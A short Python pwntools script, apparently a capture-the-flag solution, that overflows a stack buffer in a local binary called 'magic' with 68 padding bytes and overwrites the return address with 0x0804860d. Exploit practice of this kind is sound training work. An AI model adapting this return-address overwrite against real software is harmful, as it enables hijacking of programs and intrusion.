#magic

from pwn import *

p = process("./magic")


print(p.recv())

payload="A"*68

extra = p32(0x0804860d)

p.sendline(payload + extra)

print (p.recvall())